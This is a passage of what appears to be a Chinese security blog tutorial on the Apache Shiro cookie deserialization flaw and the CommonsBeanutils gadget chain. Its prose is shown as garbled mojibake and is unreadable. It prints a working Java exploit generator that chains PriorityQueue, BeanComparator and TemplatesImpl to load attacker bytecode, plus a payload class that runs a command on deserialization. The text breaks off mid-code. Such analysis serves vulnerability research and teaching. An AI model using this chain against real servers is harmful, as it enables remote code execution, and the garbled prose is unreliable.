src="https://i.mji.rip/2023/10/09/ada93e76db174a9b3b7ab91a976f1876.png" alt="image-20231008172324992"></p><p>é€šè¿‡å‰ç½®çŸ¥è¯†æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨<code>CookieRememberMeManager</code> å¯¹ <code>getRememberedSerializedIdentity</code> çš„å®ç°æ˜¯è·å– Cookie å¹¶ Base64 è§£ç ã€‚</p><p>ç„¶åå°†è§£ç åçš„ byte æ•°ç»„ä¼ å…¥ <code>convertBytesToPrincipals</code> ã€‚è¿™ä¸ªæ–¹æ³•æ‰§è¡Œäº†ä¸¤ä¸ªæ“ä½œï¼š<code>decrypt</code> å’Œ <code>deserialize</code>ã€‚</p><p><img src="https://i.mji.rip/2023/10/09/9a7ae63ef4063c0ac9f4aef335c8b5e5.png" alt="image-20231009094034525"></p><p><strong>1.decryptï¼š</strong></p><p><img src="https://i.mji.rip/2023/10/09/013ac0b14058e49e6bf1b1c7850eb60a.png" alt="image-20231009092114692"></p><p><img src="https://i.mji.rip/2023/10/09/b3cb68e510c6b6bc1874f49badc8d050.png" alt="image-20231009092145495"></p><p>é€šè¿‡æˆ‘ä»¬ä¹‹å‰å¯¹<code>AbstractRememberMeManager</code>ç±»ä¸­çš„æˆå‘˜å˜é‡çš„è§£é‡Šã€‚<code>cipherService</code>æ˜¯ç”¨æ¥å¯¹æ•°æ®åŠ è§£å¯†çš„ç±»ï¼Œå®é™…ä¸Šæ˜¯ <code>org.apache.shiro.crypto.AesCipherService</code> ç±»ï¼Œè¿™æ˜¯ä¸€ä¸ªå¯¹ç§°åŠ å¯†çš„å®ç°ï¼Œæ‰€ä»¥åŠ è§£å¯†çš„ key æ˜¯ä½¿ç”¨äº†åŒä¸€ä¸ªã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŸ¥é“æ•´ä¸ª<strong>decrypt</strong>å°±æ˜¯ç›¸å½“äºç”¨<code>AesCipherService</code> è¿›è¡Œè§£å¯†ï¼Œæœ€åè¿”å›è§£å¯†åçš„æ•°ç»„ã€‚</p><p><strong>2.deserialize</strong></p><p><img src="https://i.mji.rip/2023/10/09/648d0bcc345f4247faecf6a0a5cdd68b.png" alt="image-20231009094159287"></p><p><code>deserialize</code> è°ƒç”¨ <code>this.serializer#deserialize</code> æ–¹æ³•ååºåˆ—åŒ–è§£å¯†åçš„æ•°æ®ã€‚</p><p><img src="https://i.mji.rip/2023/10/09/4d4f12f1f63a2b5f224bf7f324242149.png" alt="image-20231009094416710"></p><p>åœ¨ Shiro ä¸­ï¼Œåºåˆ—åŒ–å™¨çš„é»˜è®¤å®ç°æ˜¯ DefaultSerializerï¼Œå¯ä»¥çœ‹åˆ°å…¶ <code>deserialize</code> æ–¹æ³•ä½¿ç”¨ Java åŸç”Ÿååºåˆ—åŒ–ï¼Œä½¿ç”¨ ByteArrayInputStream å°† byte è½¬ä¸º ObjectInputStream ï¼Œå¹¶è°ƒç”¨ <code>readObject</code> æ–¹æ³•æ‰§è¡Œååºåˆ—åŒ–æ“ä½œã€‚ååºåˆ—åŒ–å¾—åˆ°çš„ PrincipalCollection ä¼šè¢« set åˆ° SubjectContext ä¾›åç»­çš„æ ¡éªŒè°ƒç”¨ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯ Shiro åˆ›å»º Subject æ—¶æ‰§è¡Œçš„é€»è¾‘ï¼Œè·Ÿä¸‹æ¥åå°±çœ‹åˆ°äº†å®Œæ•´çš„æ¼æ´è§¦å‘é“¾ï¼šæ”»å‡»è€…æ„é€ æ¶æ„çš„ååºåˆ—åŒ–æ•°æ®ï¼Œä½¿ç”¨ç¡¬ç¼–ç çš„ AES åŠ å¯†ï¼Œç„¶å Base64 ç¼–ç æ”¾åœ¨ Cookie ä¸­ï¼Œå³å¯è§¦å‘æ¼æ´åˆ©ç”¨ã€‚</p><h2 id="CBé“¾"><a href="#CBé“¾" class="headerlink" title="CBé“¾"></a>CBé“¾</h2><p>ä¸ºä»€ä¹ˆè¦åœ¨Shiroä¸­ä»‹ç»CBå‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºShiroæœ¬èº«å°±ä¾èµ–<code>commons-beanutils</code>ç»„ä»¶ã€‚å…¶å®CCå’ŒCBç»„ä»¶åœ¨åº•å±‚è¿˜æ˜¯æœ‰å¾ˆå¤šå…³è”çš„(æ¯”å¦‚æˆ‘ä»¬ç¨åä¼šåˆ†æåˆ°çš„BeanComparator)ã€‚æ‰€ä»¥æœ‰çš„æ–‡ç« ä¼šç»™ShiroåŠ ä¸Š<code>commons-collections</code>ï¼Œæ¥æ‰“Shiroçš„ccä¾èµ–ï¼Œå…¶å®å°±æ˜¯C2+C3+C6éƒ¨åˆ†å…³é”®ä»£ç æ’åˆ—ç»„åˆã€‚æˆ‘ä»¬æœ¬ç¯‡ä¸»è¦ä»‹ç»Shiroæ— ä¾èµ–çš„CBé“¾ã€‚</p><h3 id="å‰ç½®çŸ¥è¯†-1"><a href="#å‰ç½®çŸ¥è¯†-1" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><h4 id="ä»€ä¹ˆæ˜¯JavaBeanï¼Ÿï¼Ÿï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯JavaBeanï¼Ÿï¼Ÿï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯JavaBeanï¼Ÿï¼Ÿï¼Ÿ"></a>ä»€ä¹ˆæ˜¯JavaBeanï¼Ÿï¼Ÿï¼Ÿ</h4><p>JavaBeanæ˜¯ç¬¦åˆå¦‚ä¸‹æ ‡å‡†çš„Javaç±»ï¼š</p><ul><li>ç±»æ˜¯å…¬å…±çš„</li><li>æœ‰ä¸€ä¸ªæ— å‚å…¬å…±çš„æ„é€ æ–¹æ³•</li><li>æœ‰ç§æœ‰å±æ€§</li><li>æœ‰å¯¹åº”å…¬å…±çš„getterã€setter</li></ul><p>æ¯”å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String Name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String Name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.Name = Name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="BeanComparator"><a href="#BeanComparator" class="headerlink" title="BeanComparator"></a>BeanComparator</h4><p>BeanComparator æ˜¯ commons-beanutils æä¾›çš„ç”¨æ¥æ¯”è¾ƒä¸¤ä¸ª JavaBean æ˜¯å¦ç›¸ç­‰çš„ç±»ï¼Œå…¶å®ç°äº†<code>java.util.Comparator</code> æ¥å£ã€‚</p><p>BeanComparator åœ¨åˆå§‹åŒ–æ—¶å¯ä»¥æŒ‡å®š property å±æ€§åç§°å’Œ comparator å¯¹æ¯”å™¨ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œåˆ™é»˜è®¤æ˜¯ ComparableComparator ã€‚</p><p><img src="https://i.mji.rip/2023/10/07/6dbdcc1bbdaa14a173949041d00e39e0.png" alt="image-20231007155948760"></p><p>BeanComparator çš„ compare æ–¹æ³•æ¥æ”¶ä¸¤ä¸ªå¯¹è±¡ï¼Œåˆ†åˆ«è°ƒç”¨ <code>PropertyUtils.getProperty()</code> æ–¹æ³•è·å–ä¸¤ä¸ªå¯¹è±¡çš„ property å±æ€§çš„å€¼ï¼Œç„¶åè°ƒç”¨ <code>internalCompare()</code> æ–¹æ³•è°ƒç”¨å®ä¾‹åŒ–æ—¶åˆå§‹åŒ–çš„ comparator çš„ compare æ–¹æ³•è¿›è¡Œæ¯”è¾ƒã€‚</p><p><img src="https://img2023.cnblogs.com/blog/3074366/202307/3074366-20230730190833010-461293979.png" alt="image-20231007155948768"></p><p>ç¬¬äºŒä¸ªå‚æ•°(comparator)å¯ä»¥ä¼ å…¥å®ç°<code>Comparator</code>ä¸”å¯åºåˆ—åŒ–çš„ä»»æ„ç±»</p><h4 id="PropertyUtils-getProperty"><a href="#PropertyUtils-getProperty" class="headerlink" title="PropertyUtils.getProperty()"></a>PropertyUtils.getProperty()</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyUtils.getProperty(Object JavaBeanï¼ŒString <span class="hljs-string">&quot;JavaBeançš„å±æ€§&quot;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨commons-beanutilsä¸­æä¾›äº†ä¸€ä¸ªé™æ€æ–¹æ³•<code>PropertyUtils.getProperty()</code>å®ƒå¯ä»¥ç›´æ¥è°ƒç”¨ä»»æ„JavaBeançš„getteræ–¹æ³•ã€‚å®ƒæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼šä¸€ä¸ªæ˜¯JavaBeançš„å®ä¾‹å¯¹è±¡ï¼Œä¸€ä¸ªæ˜¯JavaBeançš„å±æ€§ã€‚</p><p>ä¸¾ä¸ªæ —å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æˆ‘ä»¬æ­£å¸¸è°ƒç”¨getæ–¹æ³•æ˜¯è¿™æ ·çš„ï¼š</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;ç‹—è›‹&quot;</span>);<br>person.getName();<br><br><span class="hljs-comment">//è€ŒPropertyUtils.getProperty:</span><br> <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;ç‹—è›‹&quot;</span>);<br> PropertyUtils.getProperty(person,<span class="hljs-string">&quot;name&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="åˆ†æè¿‡ç¨‹"><a href="#åˆ†æè¿‡ç¨‹" class="headerlink" title="åˆ†æè¿‡ç¨‹"></a>åˆ†æè¿‡ç¨‹</h3><p>TemplatesImpl ç±»ä½äº<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>ï¼Œå®ç°äº† <code>Serializable</code> æ¥å£ï¼Œå› æ­¤å®ƒå¯ä»¥è¢«åºåˆ—åŒ–ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æ¼æ´è§¦å‘ç‚¹ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬æ³¨æ„åˆ°è¯¥ç±»ä¸­å­˜åœ¨ä¸€ä¸ªæˆå‘˜å±æ€§ <code>_class</code>ï¼Œæ˜¯ä¸€ä¸ª Class ç±»å‹çš„æ•°ç»„ï¼Œæ•°ç»„é‡Œä¸‹æ ‡ä¸º<code>_transletIndex</code> çš„ç±»ä¼šåœ¨ <code>getTransletInstance()</code> æ–¹æ³•ä¸­ä½¿ç”¨ <code>newInstance()</code> å®ä¾‹åŒ–ã€‚</p><p><img src="https://i.mji.rip/2023/10/07/65686455e17a433872992fdb093de77e.png" alt="image-20231007151630811"></p><p>æ³¨ï¼š</p><ol><li>é¦–å…ˆå¾—ä¿è¯_nameä¸ç­‰äºnullï¼Œå¦åˆ™ä¼šç›´æ¥è¿”å›nullã€‚</li><li>å…¶æ¬¡éœ€è¦ä¿è¯_classç­‰äºnullï¼Œå› ä¸ºæˆ‘ä»¬è¦è°ƒç”¨<code>defineTransletClasses()</code></li><li>å…¶æ¬¡æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œ _ classæ˜¯æˆå‘˜å±æ€§ï¼Œä»–æ˜¯ä¸€ä¸ªClassç±»å‹çš„æ•°ç»„ï¼Œæ•°ç»„ä¸‹æ ‡ä¸º<code>_transletIndex</code>çš„ç±»ä¼šåœ¨<code>getTransletInstance()</code>æ–¹æ³•ä¸­ä½¿ç”¨<code>newInstance()</code>å®ä¾‹åŒ–</li></ol><p>è€Œç±»ä¸­çš„ <code>getOutputProperties()</code> æ–¹æ³•è°ƒç”¨ <code>newTransformer()</code> æ–¹æ³•ï¼Œè€Œ <code>newTransformer()</code> åˆè°ƒç”¨äº† <code>getTransletInstance()</code> æ–¹æ³•ã€‚</p><p><img src="https://i.mji.rip/2023/10/07/ab4c1dab90f262e979a7fc1a911230c1.png" alt="image-20231007152857156"></p><p><img src="https://i.mji.rip/2023/10/07/e141507b0ca978a40ffdf60d5c491db0.png" alt="image-20231007152959877"></p><p>è€Œ <code>getOutputProperties()</code> æ–¹æ³•å°±æ˜¯ç±»æˆå‘˜å˜é‡ <code>_outputProperties</code> çš„ getter æ–¹æ³•ã€‚</p><p>è¿™å°±ç»™äº†æˆ‘ä»¬è°ƒç”¨é“¾ï¼Œé‚£ <code>_class</code> ä¸­çš„ç±»æ˜¯å¦å¯æ§å‘¢ï¼Ÿçœ‹ä¸€ä¸‹è°ƒç”¨ï¼Œå‘ç°åœ¨ <code>readObject</code>ã€æ„é€ æ–¹æ³•ä»¥åŠ <code>defineTransletClasses()</code> ä¸­æœ‰èµ‹å€¼çš„åŠ¨ä½œã€‚</p><p><img src="https://su18.org/post-images/1616391685378.png" alt="image-20231007152959817"></p><p>å…¶ä¸­ <code>defineTransletClasses()</code> åœ¨ <code>getTransletInstance()</code> ä¸­ï¼Œå¦‚æœ <code>_class</code> ä¸ä¸ºç©ºå³ä¼šè¢«è°ƒç”¨ï¼Œçœ‹ä¸€ä¸‹ <code>defineTransletClasses()</code> çš„é€»è¾‘ï¼ˆä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šé¢è“è‰²éƒ¨åˆ†çš„ç¬¬äºŒæ­¥ï¼‰ï¼š</p><p><img src="https://i.mji.rip/2023/10/07/cee6b807659f9173a90e3c6a76ec76bf.png" alt="image-20231007153438948"></p><p>ä»£ç åŠŸèƒ½è§£é‡Šï¼š</p><ol><li>æ£€æŸ¥<code>_bytecodes</code>æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™æŠ›å‡ºå¼‚å¸¸</li><li>æ¥ç€å°±ä¼šè°ƒç”¨è‡ªå®šä¹‰çš„ClassLoaderå»åŠ è½½<code>_bytecodes</code>ä¸­çš„byte[]ã€‚è€Œ_bytecodesä¹Ÿæ˜¯è¯¥ç±»çš„æˆå‘˜å±æ€§ã€‚</li><li>å¦‚æœè¿™ä¸ªç±»çš„çˆ¶ç±»ä¸º <code>ABSTRACT_TRANSLET</code> ä¹Ÿå°±æ˜¯<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>ï¼Œå°±ä¼šå°†ç±»æˆå‘˜å±æ€§çš„ï¼Œ<code>_transletIndex</code> è®¾ç½®ä¸ºå½“å‰å¾ªç¯ä¸­çš„æ ‡è®°ä½ï¼Œè€Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œå°±æ˜¯<code>_class[0]</code>ã€‚å¦‚æœçˆ¶ç±»ä¸æ˜¯è¿™ä¸ªç±»ï¼Œå°†ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</li></ol><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ª TemplatesImpl ç±»çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ <code>_bytecodes</code> æ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„ç±»å­—èŠ‚ç ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯ AbstractTransletï¼Œæœ€ç»ˆè¿™ä¸ªç±»ä¼šè¢«åŠ è½½å¹¶ä½¿ç”¨ <code>newInstance()</code> å®ä¾‹åŒ–ã€‚å†ä¸²åˆ°ä¸Šé¢çš„compareä¸­ï¼Œè¿›è¡Œé—´æ¥è°ƒç”¨<code>_outputProperties()</code>çš„getteræ–¹æ³•æœ€ç»ˆå½¢æˆè°ƒç”¨ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦æ»¡è¶³å‡ ä¸ªæ¡ä»¶ï¼š</p><ul><li><code>_name</code>ä¸ä¸ºnullï¼ˆå¾ˆç®€å•ï¼Œéšä¾¿ä¼ Stringç±»å‹çš„å­—ç¬¦ä¸²å³å¯ï¼‰</li><li><code>_tfactory</code>ä¸ä¸ºnullï¼ˆç›´æ¥ä¼ <code>new TransformerFactoryImpl()</code>ï¼Œå› ä¸ºåœ¨å…¶readObjecté‡Œæœ‰å¯¹_tfactoryèµ‹å€¼ï¼Œæ‰€ä»¥ç›´æ¥æ‹¿æ¥ç”¨å³å¯ï¼‰</li></ul><p><img src="https://i.mji.rip/2023/10/07/a36fb17ed9dfd402bcfce78738f39a71.png" alt="image-20231007161002997"></p><p>é‚£ä¹ˆå¥½ï¼Œæˆ‘ä»¬å…ˆæ¢³ç†ä¸€ä¸‹ç°åœ¨çš„é“¾æ¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanComparator.compare() -&gt; PropertyUtils.getProperty() -&gt;  PropertyUtilsBean.getProperty() -&gt; TemplatesImpl.getOutputProperties()<br></code></pre></td></tr></table></figure><p>è€Œ CommonsBeanutils åˆ©ç”¨é“¾ä¸­æ ¸å¿ƒçš„è§¦å‘ä½ç½®å°±æ˜¯ <code>BeanComparator.compare()</code> å‡½æ•°ï¼Œå½“è°ƒç”¨ <code>BeanComparator.compare()</code> å‡½æ•°æ—¶ï¼Œå…¶å†…éƒ¨ä¼šè°ƒç”¨æˆ‘ä»¬å‰é¢è¯´çš„ <code>getProperty</code> å‡½æ•°ï¼Œè¿›è€Œè°ƒç”¨ JavaBean ä¸­å¯¹åº”å±æ€§çš„ getter å‡½æ•°ã€‚</p><p><img src="https://i.mji.rip/2023/10/07/93d7dcc91be2fd26b7026d4dc6013aad.png" alt="image-20231007165221528"></p><p>è¿™é‡Œä¼šè°ƒç”¨<code>PropertyUtils.getProperty()</code>æ–¹æ³• å› æ­¤é€šè¿‡ç»™ o1èµ‹å€¼æ„é€ å¥½çš„templateså¯¹è±¡ï¼Œpropertyèµ‹å€¼ä¸ºTemplatesImplçš„ outputPropertieså±æ€§ï¼Œå³å¯è°ƒç”¨ <code>TemplatesImpl.getOutputProperties()</code> å¾€ä¸‹å°±æ˜¯TemplatesImplçš„åˆ©ç”¨é“¾</p><p>é‚£ä¹ˆå¾€ä¸Šæ‰¾ å“ªé‡Œè°ƒç”¨ compare()å‘¢ï¼Ÿå¯ä»¥åˆ©ç”¨CC2&#x2F;4é“¾ä¸­ç”¨çš„ <code>PriorityQueue.readObject()</code></p><h3 id="ç»“æœå±•ç¤º"><a href="#ç»“æœå±•ç¤º" class="headerlink" title="ç»“æœå±•ç¤º"></a>ç»“æœå±•ç¤º</h3><h4 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB</span> &#123;<br>    <span class="hljs-comment">//è‡ªå®šä¹‰çš„ä¸€ä¸ªåå°„è°ƒç”¨å±æ€§çš„æ–¹æ³•ã€‚</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setfiled</span><span class="hljs-params">(Object obj,String filedname,Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(filedname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//åˆå§‹åŒ–TemplatesImpl</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//_nameä¸ä¸ºnull</span><br>        setfiled(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;yuanyi&quot;</span>);<br>        <span class="hljs-comment">//_bytecodesä¸ºè¦æ‰§è¡Œçš„classäºŒè¿›åˆ¶ç¼–ç </span><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://huanjing/exp/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes  =  &#123;code&#125;;<br>        setfiled(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        <span class="hljs-comment">//_tfactoryåœ¨readObjectä¸­æœ‰èµ‹å€¼ç›´æ¥æŠ„</span><br>        setfiled(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;); è¿™é‡Œæ˜¯ä¸ºäº†æµ‹è¯•å‰é¢çš„ä»£ç é€»è¾‘å†™çš„æ˜¯å¦æ­£ç¡®ã€‚</span><br>        <br>        <span class="hljs-comment">//åˆå§‹åŒ–BeanComparator</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-comment">//æˆ‘è¿™é‡Œç”¨çš„æ˜¯PriorityQueueçš„ä¸€å‚æ„é€ æ–¹æ³•ï¼Œå…ˆä¼ ä¸€ä¸ªå‡çš„ï¼Œåç”¨åå°„æ”¹å›çœŸçš„ã€‚</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(templates);<br>        <span class="hljs-comment">//å°†çœŸçš„ BeanComparator å†™å…¥ PriorityQueue ä¸­</span><br>        setfiled(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="Test-java"><a href="#Test-java" class="headerlink" title="Test.java"></a>Test.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span 